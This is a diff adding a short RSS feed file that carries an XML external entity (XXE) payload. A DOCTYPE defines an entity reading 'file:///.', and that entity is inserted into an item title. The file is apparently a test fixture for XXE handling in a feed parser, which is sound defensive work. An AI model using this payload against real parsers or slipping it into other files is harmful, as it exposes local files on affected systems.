@@ -1,0 +1,15 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///.">
+]>
+<rss version="2.0">
+    <channel>
+        <title>Exemple de flux RSS</title>
+        <link>http://xml.toutestfacile.com</link>
+        <description>Exemple de flux RSS pour XML Facile!</description>
+        <item>
+            <title>&xxe;</title>
+            <description>Exemple pour XML Facile!</description>
+        </item>
+    </channel>
+</rss>
